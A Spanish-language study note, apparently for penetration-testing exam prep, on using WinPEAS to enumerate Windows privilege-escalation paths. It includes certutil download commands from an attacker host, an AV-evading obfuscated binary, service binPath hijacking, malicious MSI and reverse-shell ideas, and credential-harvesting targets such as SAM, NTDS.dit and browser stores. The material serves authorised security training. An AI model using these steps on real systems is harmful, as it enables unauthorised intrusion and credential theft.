# WinPEAS

Tags: #WinPEAS #Windows #PrivEsc #Enumeracion #PostExplotacion #Automatizacion

## OBJETIVO
- Automatizar la enumeración completa del sistema Windows en busca de vectores de escalada
- Obtener un mapa rápido de misconfigs, credenciales y vulnerabilidades del sistema
- Complementar la enumeración manual con un escaneo exhaustivo

## TIPS
1. **Ejecutar siempre al entrar → es el primer paso de enumeración automatizada**
2. **Revisar por colores → Rojo = crítico → Amarillo = revisar → Verde = info**
3. **winPEASany.exe funciona en x86 y x64 → usar siempre esta versión**
4. **Si AV lo detecta → usar versión ofuscada winPEASany_ofs.exe**
5. **Guardar output a archivo → más fácil de revisar → transferir a Kali**
6. **No ejecutar en producción → genera mucho ruido**

## RECURSOS
* [WinPEAS GitHub](https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md)
* [Releases](https://github.com/peass-ng/PEASS-ng/releases) → descargar binarios precompilados

---

## 1. TRANSFERIR Y EJECUTAR

```powershell
# Transferir desde Kali
# En Kali → python3 -m http.server 80
❯ certutil -urlcache -f http://<IP_KALI>/winPEASany.exe C:\Temp\winPEAS.exe
❯ certutil -urlcache -f http://<IP_KALI>/winPEASany_ofs.exe C:\Temp\winPEAS_ofs.exe

# Desde evil-winrm
❯ upload /home/kali/winPEASany.exe

# Ejecutar desde C:\tmp o C:\Windows\Temp
❯ .\winPEASany.exe
# Versión normal → más detallada

❯ .\winPEASany_ofs.exe
# Versión ofuscada → cuando AV detecta la normal

# Guardar output a archivo → SIEMPRE hacerlo
❯ .\winPEASany.exe > C:\Temp\winpeas_output.txt
❯ .\winPEASany.exe | Out-File -Encoding ASCII C:\Temp\winpeas_output.txt

# Transferir el output a Kali para revisarlo cómodamente
❯ download C:\Temp\winpeas_output.txt    # Desde evil-winrm
```

---

## 2. EJECUTAR CHECKS ESPECÍFICOS

```powershell
# WinPEAS acepta argumentos para ejecutar solo secciones específicas
# Más rápido y menos ruido cuando ya sabes qué buscar

❯ .\winPEASany.exe systeminfo
# Solo información del sistema → OS, parches, variables de entorno

❯ .\winPEASany.exe userinfo
# Solo usuarios, grupos y privilegios

❯ .\winPEASany.exe servicesinfo
# Solo servicios → Unquoted Path, permisos débiles, binarios modificables

❯ .\winPEASany.exe applicationsinfo
# Aplicaciones instaladas → versiones → buscar CVEs

❯ .\winPEASany.exe networkinfo
# Red → interfaces, conexiones, shares → otras subredes

❯ .\winPEASany.exe windowscreds
# Credenciales → Credential Manager, autologon, GPP, wifi passwords

❯ .\winPEASany.exe filesinfo
# Archivos interesantes → configs, backups, keys, unattend

❯ .\winPEASany.exe eventsinfo
# Eventos del sistema → logs → actividad reciente

❯ .\winPEASany.exe wait
# Añadir al final → espera confirmación entre secciones → más fácil de leer
```

---

## 3. QUÉ BUSCAR EN EL OUTPUT

### Sección de privilegios — CRÍTICO
```
SeImpersonatePrivilege  → Potato attack → SYSTEM directo
SeBackupPrivilege       → leer SAM/SYSTEM → dump de hashes locales
SeDebugPrivilege        → inyectar en procesos → SYSTEM
SeRestorePrivilege      → escribir en cualquier archivo
SeAssignPrimaryToken    → similar a SeImpersonate → Potato attack

→ Cualquiera de estos en el output → ir a nota Potato_Attacks.md o Token_Impersonation.md
```

### Sección de servicios — MUY COMÚN EN EL EXAMEN
```
Unquoted Service Path   → ruta con espacios sin comillas → plantar binario
  → C:\Program Files\My App\service.exe → buscar directorio escribible en la ruta

Modifiable Service Binary → ejecutable del servicio es escribible por tu usuario
  → Reemplazar el binario → reiniciar el servicio → SYSTEM

Modifiable Service Config → puedes cambiar la configuración del servicio
  → sc config servicio binPath= "cmd /c tu_comando"
  → Reiniciar el servicio → ejecuta tu comando

→ Buscar: CanRestart: True → explotar inmediatamente
→ CanRestart: False → necesitas esperar reinicio o buscar otro vector
```

### Sección de registro
```
AlwaysInstallElevated   → ambas claves = 1 → MSI malicioso → SYSTEM
AutoLogon               → credenciales en claro en el registro → reutilizar
GPP Passwords           → archivos XML con contraseñas cifradas con clave conocida
```

### Sección de credenciales
```
Credential Manager      → cmdkey /list → credenciales guardadas
Wifi Passwords          → contraseñas de redes WiFi en claro
Browser credentials     → credenciales guardadas en navegadores
Vault credentials       → Windows Vault → tokens y credenciales
```

### Sección de archivos interesantes
```
Unattend.xml            → credenciales de instalación desatendida → base64
web.config              → credenciales de aplicaciones web IIS
applicationHost.config  → credenciales de application pools IIS
SAM backup              → C:\Windows\Repair\SAM → dump de hashes sin permisos
NTDS.dit backup         → si existe fuera del DC → dump completo del dominio
.kdbx files             → KeePass → crackear con keepass2john
id_rsa files            → claves SSH → conectar sin contraseña
```

### Sección de tareas programadas
```
Buscar: tareas que corren como SYSTEM con script/ejecutable modificable
  → Modificar el script → añadir usuario o reverse shell → esperar ejecución
```

### Sección de DLL Hijacking
```
Directorios escribibles en el PATH → plantar DLL maliciosa
Aplicaciones que buscan DLLs no encontradas → ProcMon para confirmar
```

---

## 4. FLUJO DE REVISIÓN DEL OUTPUT

```
1. Buscar SeImpersonatePrivilege → si está → Potato → SYSTEM → parar aquí
2. Buscar Unquoted Service Path con CanRestart: True → explotar directo
3. Buscar AlwaysInstallElevated = 1 → MSI malicioso → SYSTEM
4. Buscar AutoLogon credentials → credenciales en claro
5. Buscar Modifiable Service Binary o Config
6. Buscar archivos con credenciales → unattend.xml, web.config
7. Buscar GPP Passwords → descifrar automáticamente
8. Buscar tareas programadas con ejecutable modificable
9. Revisar parches instalados → buscar Kernel CVEs
```

---

## 5. COLORES EN EL OUTPUT

```
Rojo    → crítico → explotar primero → alta probabilidad de éxito
Amarillo → revisar → posible vector → requiere confirmación manual
Verde   → información → no es vector directo pero puede ser útil
Azul    → información del sistema → contexto general
```

---

## ONE-LINERS MENTALES
- Entrar a Windows → certutil descargar winPEAS → ejecutar y guardar output
- Output a archivo → transferir a Kali → revisar con calma
- Rojo en el output → ir a la nota específica del vector → explotar
- SeImpersonatePrivilege en rojo → Potato attack → SYSTEM directo
- Unquoted Path + CanRestart True → plantar binario → reiniciar → SYSTEM
- AlwaysInstallElevated True → Write-UserAddMSI o msfvenom MSI → SYSTEM
